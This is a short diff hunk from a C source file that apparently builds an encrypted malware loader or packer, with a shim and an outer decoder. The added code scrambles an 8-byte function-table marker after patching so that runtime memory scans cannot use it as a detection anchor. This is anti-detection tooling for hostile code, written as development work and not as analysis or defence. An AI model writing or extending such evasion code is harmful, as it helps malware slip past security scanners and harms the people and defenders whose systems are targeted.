@@ -2142,6 +2142,13 @@ static int build_loader(PFRITTER_CONFIG c) {
              loader_size, fn_key);
     }
 
+    /* Overwrite the fn_table marker (F1 7E 7A B1 x2) with random bytes.
+       Marker was only needed at build time to locate the table for
+       patching. Leaving it intact would give runtime memory scans a
+       stable 8-byte anchor at a known relative offset within the shim. */
+    gen_random(combined + ft_off, 8);
+    DPRINT("Scrambled fn_table marker at shim+%u", ft_off);
+
     // Outer decoder wraps the WHOLE combined blob (shim + fn-encrypted loader).
     uint8_t *encoded = malloc(combined_size);
     if(encoded == NULL) {
